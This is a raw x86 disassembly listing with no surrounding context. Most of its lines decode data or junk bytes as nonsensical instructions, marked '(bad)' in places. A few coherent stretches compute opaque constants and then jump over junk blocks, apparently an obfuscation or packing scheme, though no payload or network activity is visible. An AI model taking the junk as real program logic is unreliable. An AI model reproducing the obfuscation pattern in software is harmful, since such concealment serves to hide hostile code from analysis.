  40bde6:	jmp    0xa4ce:0x41eb6efc
  40bded:	call   0x7e6:0xe0021dd
  40bdf4:	cld    
  40bdf5:	sub    al,0x60
  40bdf7:	mov    ds:0x316b1c7d,eax
  40bdfc:	add    al,0xc8
  40bdfe:	int    0x3
  40be00:	and    eax,0x4576d277
  40be05:	repnz xchg esp,eax
  40be07:	dec    ebx
  40be08:	jno    0x40be85
  40be0a:	in     al,0xe3
  40be0c:	std    
  40be0d:	(bad)  
  40be0f:	sbb    edi,0x8430dfe5
  40be15:	mov    bh,0x53
  40be17:	push   eax
  40be18:	cmc    
  40be19:	jbe    0x40bdc4
  40be1b:	dec    ecx
  40be1c:	rcr    DWORD PTR [esp+ebx*2-0x11aee399],0x5c
  40be24:	mov    al,0x1f
  40be26:	out    dx,al
  40be27:	pop    ebp
  40be28:	fwait
  40be29:	mov    esp,0xfc67d767
  40be2e:	add    esi,0xffffffc7
  40be31:	xchg   esi,eax
  40be32:	cmc    
  40be33:	inc    edi
  40be34:	or     ebx,DWORD PTR [esi+0x15]
  40be37:	mov    ebp,0x3fbb5b6a
  40be3c:	xor    BYTE PTR ds:0x833606a1,ch
  40be42:	and    DWORD PTR [edi-0x2b488d54],edx
  40be48:	add    al,0x2e
  40be4a:	mov    bl,0xdc
  40be4c:	cld    
  40be4d:	out    0x1a,al
  40be4f:	dec    ebx
  40be50:	xchg   ebx,eax
  40be51:	sahf   
  40be52:	inc    ebx
  40be53:	cs test eax,0x79506e50
  40be59:	cmp    ah,BYTE PTR [eax]
  40be5b:	push   es
  40be5c:	mov    BYTE PTR [edi-0x67],ah
  40be5f:	jo     0x40be22
  40be61:	cs dec edx
  40be63:	pushf  
  40be64:	je     0x40bead
  40be66:	pusha  
  40be67:	sbb    al,0x73
  40be69:	sar    DWORD PTR [eax+edx*1-0xf],0xaa
  40be6e:	out    dx,eax
  40be6f:	inc    edx
  40be70:	stos   BYTE PTR es:[edi],al
  40be71:	mov    bl,0xe1
  40be73:	mov    ds:0x8db14677,al
  40be78:	outs   dx,BYTE PTR ds:[esi]
  40be79:	(bad)  
  40be7a:	mov    dh,0x50
  40be7c:	dec    DWORD PTR [ecx]
  40be7e:	cmp    al,0xe2
  40be80:	mov    ch,0x4d
  40be82:	cmp    BYTE PTR [ecx+edi*4],al
  40be85:	leave  
  40be86:	(bad)  
  40be87:	cmp    esi,DWORD PTR [ebx]
  40be89:	iret   
  40be8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be8b:	sti    
  40be8c:	mov    fs,esi
  40be8e:	mov    bl,0x9b
  40be90:	popa   
  40be91:	aad    0xb4
  40be93:	mov    edx,0xada5ede7
  40be98:	jecxz  0x40be2c
  40be9a:	dec    esp
  40be9b:	stos   DWORD PTR es:[edi],eax
  40be9c:	fiadd  DWORD PTR [edi-0x5b]
  40be9f:	loope  0x40be87
  40bea1:	fdiv   st(1),st
  40bea3:	jmp    0x27ca63dc
  40bea8:	dec    edi
  40bea9:	xor    BYTE PTR [ecx+0x5baf9a2e],al
  40beaf:	rcr    DWORD PTR ds:0xc478ccd2,0x3b
  40beb6:	xor    al,0x9d
  40beb8:	in     eax,0x86
  40beba:	sahf   
  40bebb:	loope  0x40bed6
  40bebd:	mov    ch,0x21
  40bebf:	pop    es
  40bec0:	jo     0x40beea
  40bec2:	mov    bl,0x57
  40bec4:	in     al,0x63
  40bec6:	into   
  40bec7:	xchg   DWORD PTR [edi*1-0x5e60a239],ebx
  40bece:	jl     0x40beeb
  40bed0:	sar    BYTE PTR [ebx-0x64],0xb5
  40bed4:	cmp    bl,BYTE PTR [edi]
  40bed6:	add    BYTE PTR [ecx+0x2e],dh
  40bed9:	or     eax,0x32f228f7
  40bede:	sbb    eax,0xccd32254
  40bee3:	mov    ah,BYTE PTR [edx+edi*2+0x43]
  40bee7:	sbb    al,0x60
  40bee9:	xchg   BYTE PTR [ebp-0x31],bl
  40beec:	das    
  40beed:	test   BYTE PTR [ecx+0x26dd98d0],ah
  40bef3:	adc    dh,0x24
  40bef6:	jle    0x40bed0
  40bef8:	cs int 0x3f
  40befb:	bound  ebx,QWORD PTR [ebx+0x79]
  40befe:	pushf  
  40beff:	(bad)  
  40bf00:	in     al,0xc5
  40bf02:	xor    bh,cl
  40bf04:	rol    BYTE PTR [ebp-0x54],0xc7
  40bf08:	inc    ebp
  40bf09:	cld    
  40bf0a:	test   BYTE PTR [ebp+0x0],dh
  40bf0d:	add    bh,al
  40bf0f:	inc    ebp
  40bf10:	clc    
  40bf11:	lahf   
  40bf12:	jl     0x40bf14
  40bf14:	add    BYTE PTR [ebx-0x2dcc07bb],cl
  40bf1a:	push   0x3
  40bf1c:	pop    ecx
  40bf1d:	div    ecx
  40bf1f:	mov    ecx,DWORD PTR [ebp-0x4]
  40bf22:	xor    edx,edx
  40bf24:	push   0x2
  40bf26:	add    eax,0x14d3
  40bf2b:	and    eax,ecx
  40bf2d:	mov    ecx,0x6404
  40bf32:	sub    ecx,eax
  40bf34:	mov    DWORD PTR [ebp-0x74],ecx
  40bf37:	mov    DWORD PTR [ebp-0xc],0x13b5
  40bf3e:	mov    DWORD PTR [ebp-0x8],0x2e54
  40bf45:	mov    DWORD PTR [ebp-0x4],0x2f11
  40bf4c:	mov    eax,DWORD PTR [ebp-0x8]
  40bf4f:	mov    ecx,DWORD PTR [ebp-0x4]
  40bf52:	jmp    0x40c35d
  40bf57:	std    
  40bf58:	jno    0x40bf52
  40bf5a:	dec    ecx
  40bf5b:	mov    esp,0x32b9b44c
  40bf60:	rcr    DWORD PTR [esi-0x5d505c70],1
  40bf66:	nop
  40bf67:	inc    edx
  40bf68:	(bad)  
  40bf69:	mov    esi,0xbec492be
  40bf6e:	mov    esi,0xc25cb17f
  40bf73:	mov    al,ds:0xb60ab429
  40bf78:	cmp    eax,0x88a14738
  40bf7d:	mov    ds:0x3120942e,al
  40bf82:	mov    eax,ds:0xd72a7828
  40bf87:	push   ss
  40bf88:	mov    edx,0xbe4d5614
  40bf8d:	xchg   esi,eax
  40bf8e:	out    0xf6,eax
  40bf90:	xchg   esi,eax
  40bf91:	push   cs
  40bf92:	xor    eax,0xf8268f35
  40bf97:	aam    0xd9
  40bf99:	add    al,0x7c
  40bf9b:	pop    es
  40bf9c:	stc    
  40bf9d:	jbe    0x40bfe0
  40bf9f:	pop    ecx
  40bfa0:	jmp    0xf459b8ab
  40bfa5:	push   es
  40bfa6:	in     eax,dx
  40bfa7:	jb     0x40bf41
  40bfa9:	jb     0x40bf7d
  40bfab:	sbb    esi,DWORD PTR [edi-0x61556ff2]
  40bfb1:	les    esi,FWORD PTR [edi-0x3838abf2]
  40bfb7:	mov    eax,0x532cb189
  40bfbc:	adc    ch,0x71
  40bfbf:	adc    al,BYTE PTR [edi-0x57]
  40bfc2:	pop    esi
  40bfc3:	arpl   WORD PTR [ebx],bx
  40bfc5:	scas   eax,DWORD PTR es:[edi]
  40bfc6:	mov    ds:0x45190083,al
  40bfcb:	push   ds
  40bfcc:	aad    0x5e
  40bfce:	push   esi
  40bfcf:	cmp    bh,BYTE PTR [esi]
  40bfd1:	mov    eax,ds:0xeddf001c
  40bfd6:	add    BYTE PTR [eax+0x7f390001],dh
  40bfdc:	dec    esi
  40bfdd:	sub    eax,0xc7ae5e4c
  40bfe2:	jno    0x40c021
  40bfe4:	daa    
  40bfe5:	lahf   
  40bfe6:	ror    DWORD PTR [eax+0x1e504cb],cl
  40bfec:	and    ebx,ebp
  40bfee:	adc    BYTE PTR [esi-0x30],cl
  40bff1:	xchg   ebp,eax
  40bff2:	fcmovnu st,st(6)
  40bff4:	(bad)  
  40bff5:	xchg   edi,eax
  40bff6:	bound  esp,QWORD PTR [ecx]
  40bff8:	mov    esp,0xb66fc1f9
  40bffd:	jbe    0x40c048
  40bfff:	fldenv ds:0x1976b695
  40c005:	sub    ch,cl
  40c007:	dec    ebp
  40c008:	push   es
  40c009:	cmp    al,0xc1
  40c00b:	xchg   edx,eax
  40c00c:	sbb    eax,0x7b7c3847
  40c011:	div    DWORD PTR [esi]
  40c013:	or     esp,DWORD PTR ss:[esi+ebp*4-0x412de2e4]
  40c01b:	adc    ecx,DWORD PTR [ebp+0x96dd265]
  40c021:	mov    ecx,0xcb6ed57
  40c026:	jne    0x40c086
  40c028:	sub    edi,eax
  40c02a:	out    0x63,eax
  40c02c:	test   BYTE PTR [edx],0xb1
  40c02f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c030:	inc    esi
  40c031:	sbb    BYTE PTR [edx+eax*8+0x45da587],ah
  40c038:	dec    ebx
  40c039:	int    0x58
  40c03b:	xchg   esp,eax
  40c03c:	mov    ch,0x62
  40c03e:	dec    DWORD PTR [ebx+0x4b95446f]
  40c044:	iret   
  40c045:	(bad)  [ebp-0x7c785f92]
  40c04b:	cmp    DWORD PTR [eax],edx
  40c04d:	xlat   BYTE PTR ds:[ebx]
  40c04e:	int    0x5
  40c050:	in     al,dx
  40c051:	shl    BYTE PTR [edx-0xb],0x74
  40c055:	mov    dh,dh
  40c057:	aam    0xb
  40c059:	cmc    
  40c05a:	sub    ecx,DWORD PTR [edx]
  40c05c:	ins    BYTE PTR es:[edi],dx
  40c05d:	ins    BYTE PTR es:[edi],dx
  40c05e:	retf   
  40c05f:	mov    DWORD PTR [esi],esi
  40c061:	and    eax,0x3aecdad0
  40c066:	lods   eax,DWORD PTR ds:[esi]
  40c067:	dec    ebx
  40c068:	cmp    eax,DWORD PTR [edx-0x3]
  40c06b:	out    dx,eax
  40c06c:	ror    DWORD PTR [eax+0x3b],cl
  40c06f:	or     al,0x4d
  40c071:	mov    ah,0x10
  40c073:	and    al,0xc1
  40c075:	xchg   ebx,eax
  40c076:	pop    edx
  40c077:	mov    gs,WORD PTR [eax+0x2b9799b]
  40c07d:	shr    DWORD PTR [edx-0x3f085ea],cl
  40c083:	mov    cs,WORD PTR [esi-0x7d]
  40c086:	popa   
  40c087:	jbe    0x40c0c7
  40c089:	xor    dl,BYTE PTR [esi-0x7ad7030c]
  40c08f:	cmp    bh,BYTE PTR [edx+0x7a8839d0]
  40c095:	jg     0x40c04d
  40c097:	pop    es
  40c098:	sbb    BYTE PTR [ebp-0x21],ch
  40c09b:	dec    edi
  40c09c:	or     esp,esi
  40c09e:	fstp   TBYTE PTR [edx+0x1767180c]
  40c0a4:	fnsave [eax+0x50702581]
  40c0aa:	in     al,dx
  40c0ab:	or     esp,DWORD PTR [esi-0x22432507]
  40c0b1:	mov    ebx,0x3474e7e1
  40c0b6:	pop    esp
  40c0b7:	pusha  
  40c0b8:	inc    edi
  40c0b9:	or     DWORD PTR es:[edx],ebx
  40c0bc:	add    BYTE PTR [ebp-0x12],ah
  40c0bf:	mov    ds:0xeeffe7ef,al
  40c0c4:	sbb    DWORD PTR ds:0xfddd867e,esi
  40c0ca:	ret    
  40c0cb:	or     esi,edx
  40c0cd:	(bad)  
  40c0ce:	retf   
  40c0cf:	mov    BYTE PTR [edx+esi*2-0x30],cl
  40c0d3:	das    
  40c0d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0d5:	push   esp
  40c0d6:	out    dx,al
  40c0d7:	pop    eax
  40c0d8:	test   BYTE PTR [edi],dl
  40c0da:	int3   
  40c0db:	fist   WORD PTR [esi+0x27]
  40c0de:	repz sbb DWORD PTR [edx+edi*8-0x80],edx
  40c0e3:	jae    0x40c093
  40c0e5:	push   0xffffffdf
  40c0e7:	jns    0x40c12c
  40c0e9:	mov    bl,bl
  40c0eb:	arpl   WORD PTR [esi+esi*1-0x1d],dx
  40c0ef:	adc    eax,0x951ee32
  40c0f4:	xor    DWORD PTR [ecx],0x3
  40c0f7:	pop    ebp
  40c0f8:	sti    
  40c0f9:	adc    DWORD PTR [esi+0x2f854a99],ecx
  40c0ff:	pop    eax
  40c100:	pop    es
  40c101:	in     al,0x31
  40c103:	xchg   ebp,eax
  40c104:	inc    ecx
  40c106:	cli    
  40c107:	adc    BYTE PTR [esi-0x5c41d2f3],ch
  40c10d:	(bad)  
  40c10e:	loopne 0x40c0e0
  40c110:	aas    
  40c111:	dec    esp
  40c112:	outs   dx,BYTE PTR ds:[esi]
  40c113:	mov    BYTE PTR [edx-0x1f],0xb2
  40c117:	pop    edi
  40c118:	es ins BYTE PTR es:[edi],dx
  40c11a:	fstenv [edi]
  40c11d:	inc    esi
  40c11e:	prefetchwt1 BYTE PTR [ebp+eax*2+0x109f49d6]
  40c126:	int    0x9e
  40c128:	push   0xab7967d1
  40c12d:	push   ecx
  40c12e:	or     ah,dl
  40c130:	xchg   edx,eax
  40c131:	sub    al,0x87
  40c133:	push   edx
  40c134:	fwait
  40c135:	mov    eax,0xda556704
  40c13a:	ret    
  40c13b:	out    0xae,eax
  40c13d:	push   cs
  40c13e:	jl     0x40c155
  40c140:	outs   dx,BYTE PTR ds:[esi]
  40c141:	adc    eax,0x6acbcda6
  40c146:	dec    esp
  40c147:	xchg   esp,eax
  40c148:	sub    al,0x30
  40c14a:	(bad)  [ebx]
  40c14c:	sbb    al,0xf3
  40c14e:	imul   ecx,DWORD PTR [ecx+0x45],0x40
  40c152:	inc    eax
  40c153:	in     al,0x79
  40c155:	call   0x88783334
  40c15a:	mov    edx,0xe2c80a1f
  40c15f:	xor    al,0x9b
  40c161:	ins    DWORD PTR es:[edi],dx
  40c162:	in     eax,0x8a
  40c164:	hlt    
  40c165:	mov    ebx,0xd05dcf49
  40c16a:	pop    edi
  40c16b:	js     0x40c1a3
  40c16d:	xor    eax,0x3756a35
  40c172:	aas    
  40c173:	sbb    al,0x20
  40c175:	or     al,0x90
  40c177:	pop    edx
  40c178:	push   esp
  40c179:	push   esp
  40c17a:	jnp    0x40c191
  40c17c:	jg     0x40c18f
  40c17e:	in     al,0x37
  40c180:	rol    DWORD PTR [ebp+0x3796d1f9],1
  40c186:	or     ebp,DWORD PTR [edi+ebx*8+0x37]
  40c18a:	je     0x40c196
  40c18c:	sub    eax,0xcc6f51c7
  40c191:	test   DWORD PTR [ebx-0x7d],0x2957237b
  40c198:	sahf   
  40c199:	jmp    0x40c207
  40c19b:	dec    ebx
  40c19c:	imul   esp,DWORD PTR [edi-0x20627afc],0xd804fcf9
  40c1a6:	outs   dx,DWORD PTR ds:[esi]
  40c1a7:	push   ds
  40c1a8:	inc    ebx
  40c1a9:	mov    ds:0x597f28cd,al
  40c1ae:	cmp    DWORD PTR [edi+eax*8-0x39],0xffffff91
  40c1b3:	cmp    BYTE PTR [ebp+0x7abebb1f],dh
  40c1b9:	mov    ds:0x43c485ea,eax
  40c1be:	in     al,dx
  40c1bf:	mov    dh,0x91
  40c1c1:	mov    ebp,0x88a66944
  40c1c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1c7:	daa    
  40c1c8:	jecxz  0x40c174
  40c1ca:	inc    esi
  40c1cb:	(bad)  
  40c1cc:	in     eax,0xb2
  40c1ce:	outs   dx,BYTE PTR ds:[esi]
  40c1cf:	std    
  40c1d0:	mov    edi,0x7b5bebf3
  40c1d5:	xor    BYTE PTR [ebp-0x40],bl
  40c1d8:	sub    BYTE PTR [ecx],ah
  40c1da:	sbb    eax,0xb803600f
  40c1df:	test   edx,ecx
  40c1e1:	arpl   WORD PTR [edi-0x355802fe],ax
  40c1e7:	rcl    dl,1
  40c1e9:	lods   eax,DWORD PTR ds:[esi]
  40c1ea:	outs   dx,DWORD PTR ds:[esi]
  40c1eb:	xor    eax,0x1f185d5a
  40c1f0:	mov    ecx,0x20efd2cc
  40c1f5:	loop   0x40c185
  40c1f7:	(bad)  
  40c1f8:	rcl    DWORD PTR [ebx+0x3e028c2],1
  40c1fe:	sbb    BYTE PTR [ebx-0x5f60e1ba],0x59
  40c205:	(bad)  
  40c206:	adc    al,0x87
  40c208:	aas    
  40c209:	mov    dl,0x22
  40c20b:	cmc    
  40c20c:	out    dx,al
  40c20d:	retf   
  40c20e:	inc    ebp
  40c20f:	mov    ch,0x9e
  40c211:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c212:	mov    ah,0xfc
  40c214:	mov    edi,0x7e9c805a
  40c219:	ds loope 0x40c1f2
  40c21c:	jo     0x40c20f
  40c21e:	cs or  al,0x71
  40c221:	pusha  
  40c222:	jae    0x40c24b
  40c224:	ret    0xcb0c
  40c227:	icebp  
  40c228:	dec    ebx
  40c229:	test   DWORD PTR [ecx+0x19],ebp
  40c22c:	enter  0x4ec5,0xa7
  40c230:	push   eax
  40c231:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c232:	rcr    cl,cl
  40c234:	cmc    
  40c235:	in     al,dx
  40c236:	and    ebx,DWORD PTR ds:0x5aa2c789
  40c23c:	push   ebp
  40c23d:	add    BYTE PTR [edi+0x79],al
  40c240:	ror    cl,cl
  40c242:	and    DWORD PTR [ebx+0x11625d13],ecx
  40c248:	mov    bl,0x69
  40c24a:	pop    eax
  40c24b:	push   ecx
  40c24c:	in     al,0x73
  40c24e:	dec    eax
  40c24f:	data16 jge 0x40c283
  40c252:	push   cs
  40c253:	xchg   ecx,eax
  40c254:	and    cl,BYTE PTR [edi-0x113e6b71]
  40c25a:	cdq    
  40c25b:	inc    edx
  40c25c:	scas   eax,DWORD PTR es:[edi]
  40c25d:	jl     0x40c203
  40c25f:	xlat   BYTE PTR ds:[ebx]
  40c260:	enter  0x613a,0x20
  40c264:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c265:	pop    edi
  40c266:	ja     0x40c206
  40c268:	inc    esi
  40c269:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c26a:	mov    ah,0x57
  40c26c:	and    esi,DWORD PTR [esi-0x51]
  40c26f:	dec    ebx
  40c270:	jp     0x40c27c
  40c272:	in     eax,dx
  40c273:	mov    ds:0x71c8d02,al
  40c278:	mov    bh,0xc2
  40c27a:	inc    ebx
  40c27b:	and    eax,esi
  40c27d:	xchg   esp,eax
  40c27e:	jge    0x40c237
  40c280:	mov    al,0x6
  40c282:	and    ebx,edi
  40c284:	in     al,0x76
  40c286:	fnsave [edx]
  40c288:	jmp    0xaf4f:0x345ddb68
  40c28f:	mov    ?,WORD PTR [edx]
  40c291:	adc    DWORD PTR ss:[ecx+0x15],ecx
  40c295:	repz test ax,0x2d9a
  40c29a:	push   edx
  40c29b:	dec    esi
  40c29c:	sar    DWORD PTR [ebx+0xa],cl
  40c29f:	fst    QWORD PTR [edx]
  40c2a1:	jnp    0x40c30c
  40c2a3:	pushf  
  40c2a4:	cld    
  40c2a5:	pop    ebx
  40c2a6:	ins    BYTE PTR es:[edi],dx
  40c2a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2a8:	pop    eax
  40c2a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2aa:	stc    
  40c2ab:	push   eax
  40c2ac:	test   ch,0x5a
  40c2af:	mov    cl,0x8a
  40c2b1:	xchg   esi,eax
  40c2b2:	sub    eax,0xac17f7f0
  40c2b7:	inc    ebx
  40c2b8:	jmp    0x7d667036
  40c2bd:	sub    cl,BYTE PTR [esi+0x6e5237cd]
  40c2c3:	pop    ds
  40c2c4:	std    
  40c2c5:	pushf  
  40c2c6:	mov    eax,ds:0x92edf6b6
  40c2cb:	mov    edi,0xd707100d
  40c2d0:	dec    edi
  40c2d1:	js     0x40c2d2
  40c2d3:	inc    esp
  40c2d4:	xchg   BYTE PTR [ecx+0x2c9d4f53],bh
  40c2da:	push   es
  40c2db:	xchg   edx,edi
  40c2dd:	fldenv [ebp+eiz*8+0x6e51d4bc]
  40c2e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2e5:	repnz sahf 
  40c2e7:	xchg   ebp,eax
  40c2e8:	xchg   BYTE PTR [ebx-0x15],dl
  40c2eb:	imul   esi,esp,0x1f6eb63f
  40c2f1:	leave  
  40c2f2:	shr    BYTE PTR [edx-0x6e9867d3],1
  40c2f8:	test   DWORD PTR [ebp+0x3ee8c313],edx
  40c2fe:	or     DWORD PTR [eax-0x9],esi
  40c301:	pop    esp
  40c302:	cli    
  40c303:	gs pushf 
  40c305:	push   ebp
  40c306:	xchg   ecx,eax
  40c307:	fucom  st(1)
  40c309:	mov    ah,0xbb
  40c30b:	jae    0x40c2c8
  40c30d:	push   ebp
  40c30e:	push   edi
  40c30f:	in     al,0x4f
  40c311:	or     BYTE PTR [ebx+0x70e61f17],dh
  40c317:	cmp    edx,DWORD PTR [ecx+eiz*4+0x5e]
  40c31b:	sbb    DWORD PTR [edi],esi
  40c31d:	jge    0x40c2f8
  40c31f:	sbb    BYTE PTR ds:0x843bb613,0x1
  40c326:	and    edx,DWORD PTR [esi-0x4dcdc19d]
  40c32c:	scas   ax,WORD PTR es:[edi]
  40c32e:	sub    eax,0x6cc729ab
  40c333:	fwait
  40c334:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c335:	out    dx,eax
  40c336:	mov    BYTE PTR [esi+0x1e9cef9b],bl
  40c33c:	gs int 0x1f
  40c33f:	add    eax,esi
  40c341:	xor    eax,0x2bd8394c
  40c346:	xchg   edi,eax
  40c347:	mov    eax,ds:0x23edfc73
  40c34c:	pop    ecx
  40c34d:	sub    eax,0x2c325a9c
  40c352:	sub    bl,BYTE PTR ds:0x988bf998
  40c358:	push   cs
  40c359:	dec    eax
  40c35a:	mov    edx,DWORD PTR [esi]
  40c35c:	cmp    cl,BYTE PTR [ebp-0x65ebfe7c]
  40c362:	(bad)  
  40c363:	(bad)  
  40c364:	mov    ecx,0x5e208
  40c369:	div    ecx
  40c36b:	mov    ecx,DWORD PTR [ebp-0xc]
  40c36e:	lea    eax,[eax+ecx*1+0x40c7]
  40c375:	mov    DWORD PTR [ebp-0x24],eax
  40c378:	mov    DWORD PTR [ebp-0x4],0x1bc6
  40c37f:	mov    DWORD PTR [ebp-0x8],0x16ac
  40c386:	mov    DWORD PTR [ebp-0xc],0x2185
  40c38d:	mov    eax,DWORD PTR [ebp-0xc]
  40c390:	mov    ecx,DWORD PTR [ebp-0x8]
  40c393:	xor    eax,0x1f75
  40c398:	sub    eax,ecx
  40c39a:	mov    ecx,DWORD PTR [ebp-0x4]
  40c39d:	sub    eax,ecx
  40c39f:	xor    eax,0xc3e
  40c3a4:	mov    DWORD PTR [ebp-0x58],eax
  40c3a7:	mov    DWORD PTR [ebp-0x14],0x66bd
  40c3ae:	pop    ecx
  40c3af:	mov    DWORD PTR [ebp-0x4],ecx
  40c3b2:	mov    DWORD PTR [ebp-0x8],0x3374
  40c3b9:	mov    DWORD PTR [ebp-0xc],0x3c31
  40c3c0:	mov    eax,DWORD PTR [ebp-0xc]
  40c3c3:	mov    edx,DWORD PTR [ebp-0x8]
  40c3c6:	mov    esi,DWORD PTR [ebp-0x4]
  40c3c9:	xor    eax,edx
  40c3cb:	xor    edx,edx
  40c3cd:	div    esi
  40c3cf:	mov    edx,DWORD PTR [ebp-0x14]
  40c3d2:	and    eax,edx
  40c3d4:	sub    eax,0x680
  40c3d9:	mov    DWORD PTR [ebp-0x24],eax
  40c3dc:	mov    DWORD PTR [ebp-0x30],0x5f68
  40c3e3:	mov    DWORD PTR [ebp-0x2c],0x398b
  40c3ea:	mov    DWORD PTR [ebp-0x4],0x5034
  40c3f1:	mov    DWORD PTR [ebp-0x8],0x7cbf
  40c3f8:	mov    DWORD PTR [ebp-0xc],0x4f6c
  40c3ff:	mov    DWORD PTR [ebp-0x14],0xee2
  40c406:	mov    eax,DWORD PTR [ebp-0x14]
  40c409:	add    eax,DWORD PTR [ebp-0xc]
  40c40c:	mov    edx,DWORD PTR [ebp-0x8]
  40c40f:	xor    eax,edx
  40c411:	mov    edx,DWORD PTR [ebp-0x4]
  40c414:	or     eax,edx
  40c416:	mov    edx,DWORD PTR [ebp-0x2c]
  40c419:	or     eax,edx
  40c41b:	mov    edx,DWORD PTR [ebp-0x30]
  40c41e:	and    eax,edx
  40c420:	mov    edx,0x5b68
  40c425:	sub    edx,eax
  40c427:	mov    DWORD PTR [ebp-0x24],edx
  40c42a:	mov    DWORD PTR [ebp-0x48],0x3308
  40c431:	mov    DWORD PTR [ebp-0x44],0x59a4
  40c438:	mov    DWORD PTR [ebp-0x38],0x2775
  40c43f:	mov    DWORD PTR [ebp-0x34],0x4da
  40c446:	mov    DWORD PTR [ebp-0x40],0x49d8
  40c44d:	mov    DWORD PTR [ebp-0x3c],0x1b5c
  40c454:	mov    DWORD PTR [ebp-0x28],0x338c
  40c45b:	mov    DWORD PTR [ebp-0x24],0x68ed
  40c462:	jmp    0x40c86d
  40c467:	inc    esi
  40c468:	outs   dx,DWORD PTR ds:[esi]
  40c469:	mov    ebx,0x8abcbc70
  40c46e:	ja     0x40c492
  40c470:	or     DWORD PTR [esi-0x185efc31],ebp
  40c476:	jecxz  0x40c48e
  40c478:	iret   
  40c479:	mov    esi,0xbec492be
  40c47e:	mov    esi,0x94636bfd
  40c483:	jcxz   0x40c445
  40c486:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c487:	jl     0x40c4e6
  40c489:	mov    al,0x2c
  40c48b:	pop    edx
  40c48c:	xchg   esi,eax
  40c48d:	cdq    
  40c48e:	xchg   BYTE PTR [ebx-0x3f],cl
  40c491:	cmp    ebp,DWORD PTR [ebp-0x7a47f6b2]
  40c497:	test   BYTE PTR [edx*8+0x361ddfe],dh
  40c49e:	(bad)  
  40c49f:	xlat   BYTE PTR ds:[ebx]
  40c4a0:	mov    ebp,0x5d03eacf
  40c4a5:	cmp    al,0x60
  40c4a7:	jmp    0x984d3b28
  40c4ac:	jle    0x40c4db
  40c4ae:	dec    ebp
  40c4af:	push   ebx
  40c4b0:	mov    dh,0x1b
  40c4b2:	aaa    
  40c4b3:	pop    ebx
  40c4b4:	out    0x43,eax
  40c4b6:	mov    dl,0x23
  40c4b8:	xor    DWORD PTR ds:0xe9325b3e,ecx
  40c4be:	add    esi,DWORD PTR [eax-0x1cec8947]
  40c4c4:	jge    0x40c527
  40c4c6:	scas   eax,DWORD PTR es:[edi]
  40c4c7:	pop    ss
  40c4c8:	sbb    bl,0x27
  40c4cb:	or     eax,0x7dda092f
  40c4d0:	mov    dh,0x2e
  40c4d2:	ins    DWORD PTR es:[edi],dx
  40c4d3:	push   0xffffff9d
  40c4d5:	push   edx
  40c4d6:	mov    ebp,0x34c0898b
  40c4db:	popf   
  40c4dc:	cmp    BYTE PTR ds:0xd3542f46,0x37
  40c4e3:	stos   BYTE PTR es:[edi],al
  40c4e4:	gs dec ecx
  40c4e6:	cmp    ah,BYTE PTR [edx*4+0x168a7150]
  40c4ed:	ins    BYTE PTR es:[edi],dx
  40c4ee:	pop    esp
  40c4ef:	cwde   
  40c4f0:	fwait
  40c4f1:	inc    eax
  40c4f2:	ficom  WORD PTR [edi+0x23]
  40c4f5:	popa   
  40c4f6:	cld    
  40c4f7:	clc    
  40c4f8:	out    dx,eax
  40c4f9:	aad    0x1e
  40c4fb:	pop    ebx
  40c4fc:	dec    esp
  40c4fd:	sti    
  40c4fe:	xor    al,0x7a
  40c500:	mov    al,0x90
  40c502:	mov    DWORD PTR [ebx-0x537c8da6],0xf283247f
  40c50c:	pop    ds
  40c50d:	adc    bh,BYTE PTR [ebx+eiz*8]
  40c510:	lods   eax,DWORD PTR ds:[esi]
  40c511:	pop    edx
  40c512:	and    eax,0x8839f84e
  40c517:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c518:	mov    al,BYTE PTR [edx-0x3b882bc]
  40c51e:	call   0xc0e1887d
  40c523:	sar    ah,cl
  40c525:	jo     0x40c4fd
  40c527:	adc    esi,ecx
  40c529:	pop    ebx
  40c52a:	jmp    0xca83a475
  40c52f:	push   esp
  40c530:	leave  
  40c531:	jge    0x40c520
  40c533:	dec    ebp
  40c534:	and    al,0x75
  40c536:	popa   
  40c537:	ins    BYTE PTR es:[edi],dx
  40c538:	inc    ebp
  40c539:	or     bh,dh
  40c53b:	pop    eax
  40c53c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c53d:	in     al,0x62
  40c53f:	repz push 0xffffffa0
  40c542:	xor    bl,BYTE PTR [esi+ecx*1+0x2784450a]
  40c549:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c54a:	jmp    DWORD PTR [esi+0x4]
  40c54d:	pop    eax
  40c54e:	xchg   edi,eax
  40c54f:	xchg   ebp,eax
  40c550:	sbb    dh,ch
  40c552:	int3   
  40c553:	(bad)  
  40c554:	js     0x40c5c6
  40c556:	je     0x40c53c
  40c558:	icebp  
  40c559:	and    BYTE PTR [edi+0x65785d1f],cl
  40c55f:	imul   edi,DWORD PTR ds:0xace86c17,0x44
  40c566:	inc    DWORD PTR [edi]
  40c568:	cld    
  40c569:	div    BYTE PTR [esi*4+0x6298b403]
  40c570:	das    
  40c571:	jne    0x40c5aa
  40c573:	xlat   BYTE PTR ds:[ebx]
  40c574:	xchg   esp,eax
  40c575:	retf   0x5ea
  40c578:	(bad)  
  40c579:	jnp    0x40c4ff
  40c57b:	je     0x40c56a
  40c57d:	jecxz  0x40c593
  40c57f:	mov    ds:0x4e7d0bf,eax
  40c584:	stc    
  40c585:	sub    al,0xfb
  40c587:	push   ebx
  40c588:	lock sahf 
  40c58a:	rol    BYTE PTR [eax+0x364c460d],cl
  40c590:	mov    dh,0x9f
  40c592:	push   esp
  40c593:	imul   ebx,DWORD PTR [edi],0xffffffd8
  40c596:	jb     0x40c5ff
  40c598:	mov    ecx,0x6e4c6ce
  40c59d:	(bad)  
  40c59e:	fs aas 
  40c5a0:	mov    edi,0x3a2947c
  40c5a5:	outs   dx,DWORD PTR gs:[esi]
  40c5a7:	pop    ebx
